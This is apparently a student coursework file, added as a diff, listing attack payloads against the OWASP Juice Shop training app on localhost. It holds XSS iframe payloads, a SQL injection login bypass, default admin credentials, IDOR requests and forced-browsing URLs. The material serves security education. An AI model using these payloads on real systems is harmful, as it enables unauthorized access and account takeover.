@@ -1,0 +1,72 @@
+==============================================================================
+ OWASP Juice Shop - Attack Payloads
+ CSF IA 2 | Nayanika Khote (16014124026), Gayatri Markale (16014124036)
+ Target: OWASP Juice Shop v20.2.0 @ http://localhost:3000
+ Method: browser only (address bar + DevTools F12). No Burp, no proxy.
+==============================================================================
+
+--------------------------------------------------------------
+ A05 INJECTION
+--------------------------------------------------------------
+
+# DOM XSS  -> paste in the search box
+<iframe src="javascript:alert(`xss`)">
+
+# Reflected XSS  -> order-tracking id, in the URL
+http://localhost:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
+
+# Bonus Payload (advanced XSS)  -> paste in the search box
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+
+# Login Admin - SQL Injection  -> login form
+Email    : ' OR 1=1--
+Password : 12345            (any value works)
+
+--------------------------------------------------------------
+ A07 AUTHENTICATION FAILURES
+--------------------------------------------------------------
+
+# Password Strength  -> weak, unchanged admin credentials
+Email    : admin@juice-sh.op
+Password : admin123
+
+--------------------------------------------------------------
+ A01 BROKEN ACCESS CONTROL
+--------------------------------------------------------------
+
+# Confidential Document  -> public directory + confidential file
+http://localhost:3000/ftp/
+http://localhost:3000/ftp/acquisitions.md
+
+# Admin Section  -> hidden admin route reachable directly
+http://localhost:3000/#/administration
+
+# View Basket (IDOR)  -> request another user's basket (see exploit_snippets.js)
+GET /rest/basket/2   with your own  Authorization: Bearer <token>
+
+# Five-Star Feedback  -> via admin panel
+http://localhost:3000/#/administration  ->  Customer Feedback  ->  delete every 5-star row
+
+--------------------------------------------------------------
+ A02 SECURITY MISCONFIGURATION
+--------------------------------------------------------------
+
+# Deprecated Interface  -> complaint form file upload
+Upload test.xml  (content: <test>hello</test>)  at  http://localhost:3000/#/complain
+
+--------------------------------------------------------------
+ A10 MISHANDLING OF EXCEPTIONAL CONDITIONS
+--------------------------------------------------------------
+
+# Error Handling  -> invalid API route provokes a raw error / stack trace
+http://localhost:3000/rest/qwertz
+
+--------------------------------------------------------------
+ MISCELLANEOUS / TRANSPARENCY
+--------------------------------------------------------------
+
+# Score Board (hidden page)
+http://localhost:3000/#/score-board
+
+# Privacy Policy (awareness)
+http://localhost:3000/#/privacy-security/privacy-policy
